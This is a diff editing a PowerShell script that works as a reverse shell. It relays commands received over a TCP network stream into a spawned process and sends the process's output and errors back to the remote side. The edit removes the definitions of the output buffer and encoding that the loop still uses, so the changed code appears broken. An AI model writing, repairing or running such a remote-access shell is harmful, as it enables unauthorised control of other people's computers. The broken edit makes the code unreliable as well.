@@ -9,18 +9,16 @@ $Process.StartInfo.RedirectStandardOutput = $true
 $Process.StartInfo.RedirectStandardError = $true
 $Process.StartInfo.UseShellExecute = $false
 $Process.Start()
-$InputBuffer = New-Object System.Text.StringBuilder
 
-# Async output handling
-$OutputBuffer = New-Object System.Byte[] 4096
-$Encoding = [System.Text.Encoding]::ASCII
+# Initialize the input buffer and encoding for stream communication
+$InputBuffer = New-Object System.Text.StringBuilder
 
 while($true) {
     # Check network stream
-    if($NetworkStream.DataAvailable) {
+    if($NetworkStream.DataAvailable -eq $true){
         $Read = $NetworkStream.Read($OutputBuffer, 0, 4096)
         $Command = $Encoding.GetString($OutputBuffer, 0, $Read)
-        $Process.StandardInput.WriteLine($Command)
+        $Process.StandardInput.WriteLine($Command + "`n")
     }
 
     # Check process output
@@ -29,7 +27,7 @@ while($true) {
         $StreamWriter.Write($Output)
         $StreamWriter.Flush()
     }
-
+    
     # Error handling
     if($Process.StandardError.Peek() -ne -1) {
         $ErrorOutput = $Process.StandardError.ReadToEnd()
@@ -38,7 +36,8 @@ while($true) {
     }
 
     Start-Sleep -Milliseconds 100
-    if($TCPClient.Connected -ne $true) { break }
+
+    if($TCPClient.Connected -eq $false){ break }
 }
 
 $StreamWriter.Close()
